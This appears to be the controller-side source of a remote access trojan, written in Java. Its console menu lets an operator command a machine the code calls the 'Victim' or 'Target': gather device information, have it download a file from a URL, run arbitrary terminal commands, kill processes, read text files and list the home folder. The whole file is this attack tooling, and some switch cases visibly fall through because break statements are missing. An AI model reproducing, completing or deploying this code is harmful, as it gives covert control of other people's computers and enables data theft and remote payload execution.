package user_interface;

import java.io.BufferedReader;
import java.io.Console;
import java.io.IOException;
import java.io.InputStreamReader;

import Application.Streams;

public class Connections {
 private Streams selectedstreams;
public Connections(Streams selectedstreams) {
if (selectedstreams == null) {
	throw new IllegalArgumentException();
}
this.selectedstreams = selectedstreams;
}

public void execute() {
	while(true) {
	System.out.println("Select an opration to execute : ");
	System.out.println("(1)- Show Device's Informations.");
	System.out.println("(2)- Upload a file to the Victim.");
	System.out.println("(3)- Execute Terminal Commands.");
	System.out.println("(4)- Kill a process.");
	System.out.println("(5)- Get a text file from Target");
	System.out.println("(6)- Get Target Home Folder");
	System.out.println("(7)- Back to menu.");
	try {
		String selected = new BufferedReader(new InputStreamReader(System.in)).readLine();
	switch(selected) {
	case "1": selectedstreams.sendMsG("INFO");
              System.out.println(selectedstreams.ReadMsg());
              System.out.println(selectedstreams.ReadMsg());
              System.out.println(selectedstreams.ReadMsg());
              System.out.println(selectedstreams.ReadMsg());
              System.out.println(selectedstreams.ReadMsg());
              break;

 	case "2" :  selectedstreams.sendMsG("Download");
 	            BufferedReader DURL = new BufferedReader(new InputStreamReader(System.in));
 	            BufferedReader DName = new BufferedReader(new InputStreamReader(System.in));
 	            String DownloadURL = null;
 	            String DownloadName = null;
	            System.out.println("Enter the File URL : ");
 	            DownloadURL = DURL.readLine();
 	            System.out.println("Enter the File name to save : ");
 	            DownloadName=DName.readLine();
 	            selectedstreams.sendMsG(DownloadURL);
 	            selectedstreams.sendMsG(DownloadName);
 	            System.out.println(selectedstreams.ReadMsg());
                break;
 		
 	case "3": selectedstreams.sendMsG("Eecx");
              BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
              String CommandStr = null;
              System.out.println("Enter command to execute : ");
              CommandStr = br.readLine();
              selectedstreams.sendMsG(CommandStr);
              int i2 = 0;
              int f2 = Integer.parseInt(selectedstreams.ReadMsg());
              System.out.println("Number of Lines in the selected file : " + f2);
              while(true) {
                if (i2 == f2) {
	            break;
               }
 	             System.out.println(selectedstreams.ReadMsg());
 	             i2++;
               }
              break;
 	case "4":
 		selectedstreams.sendMsG("Kill");
        BufferedReader brr = new BufferedReader(new InputStreamReader(System.in));
        String ProcessName = null;
        System.out.println("Enter process name to kill : ");
        ProcessName = brr.readLine();
        selectedstreams.sendMsG(ProcessName);
        System.out.println(selectedstreams.ReadMsg());
        break;
        
 	case "5":selectedstreams.sendMsG("GetText");
             BufferedReader TextPath = new BufferedReader(new InputStreamReader(System.in));
             String PathStr = null;
             System.out.println("Enter text file path to read : ");
             PathStr = TextPath.readLine();
             selectedstreams.sendMsG(PathStr);
             int i = 0;
             int f = Integer.parseInt(selectedstreams.ReadMsg()) + 1;
             System.out.println("Number of Lines in the selected file : " + f);
             while(true) {
            	 if (i == f) {
            		 break;
            	 }
                    	 System.out.println(selectedstreams.ReadMsg());
                    	 i++;
             }
 	case "6" : selectedstreams.sendMsG("GetHome");
    int i1 = 0;
    int f1 = Integer.parseInt(selectedstreams.ReadMsg());
    System.out.println("Number of Lines in the selected file : " + f1);
    while(true) {
   	 if (i1 == f1) {
   		 break;
   	 }
           	 System.out.println(selectedstreams.ReadMsg());
           	 i1++;
    }                 
             
 	case "7": return;
     default:break;
	}
	
	} catch (IOException e) {
		e.printStackTrace();
	}

}
}
}